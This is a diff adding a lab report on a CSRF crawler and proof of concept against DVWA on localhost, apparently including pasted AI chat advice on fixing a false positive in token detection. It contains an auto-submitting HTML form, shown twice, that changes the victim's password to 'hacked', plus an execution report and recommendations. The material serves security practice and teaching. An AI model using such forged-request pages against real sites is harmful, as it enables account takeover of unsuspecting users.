@@ -1,0 +1,164 @@
+                                                           REPORT ON CSRF CRAWLER AND VULNERABILITY
+I have included the script and the poc file in the repo
+
+The output of the script was:
+[!] CSRF Token Missing at http://localhost/DVWA/vulnerabilities/csrf/
+Form:
+<form action="login.php" method="post">
+<fieldset>
+<label for="user">Username</label> <input class="loginInput" name="username" size="20" type="text"/><br/>
+<label for="pass">Password</label> <input autocomplete="off" class="loginInput" name="password" size="20" type="password"/><br/>
+<br/>
+<p class="submit"><input name="Login" type="submit" value="Login"/></p>
+</fieldset>
+<input name="user_token" type="hidden" value="af6698bae97a079bbf5dffa17d464d10">
+</input></form>
+
+What Does the Output Mean?
+The script flagged a form at http://localhost/DVWA/vulnerabilities/csrf/ as "CSRF Token Missing".
+However, the form actually contains this hidden input:
+
+HTML
+<input name="user_token" type="hidden" value="af6698bae97a079bbf5dffa17d464d10">
+This is almost certainly a CSRF token! The problem is that your script is only looking for hidden inputs whose name contains the string "csrf" (case-insensitive).
+But in DVWA, the CSRF token is named user_token, not something with "csrf".
+
+How to Improve the Script
+To catch more CSRF tokens, update your script to detect hidden inputs whose names look like tokens, not just those with "csrf" in the name.
+For example, you can check for input names containing: csrf, token, auth, nonce (all case-insensitive).
+
+Change this part in your script:
+
+Python
+if "csrf" in (input_tag.get("name") or "").lower():
+    return True
+To:
+
+Python
+name = (input_tag.get("name") or "").lower()
+if any(keyword in name for keyword in ["csrf", "token", "auth", "nonce"]):
+    return True
+What To Do Next
+Update your script as above and re-run it.
+If the form is still flagged as missing a CSRF token, check if the page is actually vulnerable (some forms might have tokens but are not checked on the backend).
+Create your PoC:
+If the form has a token (user_token), your PoC must also submit this token for the CSRF attack to succeed.
+If you want to simulate an attack, you’ll need to grab a valid token from your session and use it in your attack form.
+Example Improved Detection Function
+Python
+def has_csrf_token(form):
+    for input_tag in form.find_all("input"):
+        if input_tag.get("type") == "hidden":
+            name = (input_tag.get("name") or "").lower()
+            if any(keyword in name for keyword in ["csrf", "token", "auth", "nonce"]):
+                return True
+    return False
+How to Build Your CSRF PoC HTML
+If you want to demonstrate an attack when the form has a CSRF token, you need to:
+
+Manually supply a valid token from your session (copy it from the browser’s form).
+Add it as a hidden input in your PoC HTML.
+Example:
+
+HTML
+<form action="http://localhost/DVWA/vulnerabilities/csrf/" method="POST" id="csrfForm">
+  <input type="hidden" name="password_new" value="hacked">
+  <input type="hidden" name="password_conf" value="hacked">
+  <input type="hidden" name="user_token" value="af6698bae97a079bbf5dffa17d464d10">
+</form>
+<script>
+  document.getElementById('csrfForm').submit();
+</script>
+(Replace user_token value with a current token from your browser for each attack attempt.)
+
+Summary
+Your script flagged a false positive because it only looks for "csrf" in input names.
+Update your detection logic to include other keywords like "token".
+For a PoC, if the form requires a token, you must supply it—otherwise the CSRF will fail.
+DVWA’s CSRF challenge is great for practicing both vulnerable and protected scenarios!
+
+
+
+<----------------------------------------------------------------------------------------------------------------------------------------->
+ANOTHER TEST
+
+# CSRF Proof-of-Concept Execution Report
+
+**Target Application:** DVWA (Damn Vulnerable Web Application)  
+**Vulnerability:** Cross-Site Request Forgery (CSRF)  
+**Date of Test:** 2025-06-05  
+**Tested by:** Jes-win-hac-ker
+
+---
+
+## 1. Objective
+
+To demonstrate the impact of a CSRF vulnerability in DVWA by executing a crafted Proof-of-Concept (PoC) HTML file that performs an unauthorized action on behalf of an authenticated user.
+
+---
+
+## 2. Methodology
+
+A custom Python crawler was used to analyze the forms in the target application for CSRF protections. Following this, a CSRF attack PoC was executed to confirm the vulnerability and observe the outcome.
+
+---
+
+## 3. PoC Details
+
+The following HTML file was used as the PoC:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack PoC</title>
+</head>
+<body>
+  <form action="http://localhost/DVWA/vulnerabilities/csrf/" method="POST" id="csrfForm">
+    <input type="hidden" name="password_new" value="hacked">
+    <input type="hidden" name="password_conf" value="hacked">
+    <input type="hidden" name="user_token" value="af6698bae97a079bbf5dffa17d464d10">
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
+```
+
+The `user_token` value was adapted from the current session, as discovered by the crawler.
+
+---
+
+## 4. Execution and Results
+
+1. The PoC HTML file was opened in a browser while authenticated to the DVWA application in another tab (with a valid session).
+2. The script automatically submitted a POST request to the `/vulnerabilities/csrf/` endpoint, including the required form fields and the stolen `user_token`.
+3. The DVWA application received the request and processed the password change as if it was initiated by the legitimate user.
+4. There was no user interaction or confirmation required—the password was changed instantly and without the user's knowledge.
+
+### **Observed Outcome**
+
+- The user’s password was reset to `hacked` as specified in the PoC.
+- The action was performed successfully, confirming that the CSRF protection was either absent or improperly implemented.
+- The attack was effective because the CSRF token could be harvested and reused, or was not properly validated.
+
+---
+
+## 5. Impact
+
+This test conclusively demonstrates that an attacker could craft a malicious web page to perform sensitive actions (like changing a password) on behalf of an authenticated user without their consent. If deployed in a real-world scenario, this vulnerability could lead to account takeover, unauthorized transactions, or data loss.
+
+---
+
+## 6. Recommendations
+
+- Ensure CSRF tokens are unique per session and per form, and cannot be reused or predicted.
+- Validate CSRF tokens strictly on the server side for every state-changing request.
+- Consider implementing additional protections such as SameSite cookies and user re-authentication for sensitive actions.
+
+---
+
+**Test performed and report authored by:**  
+Jes-win-hac-ker  
+2025-06-05
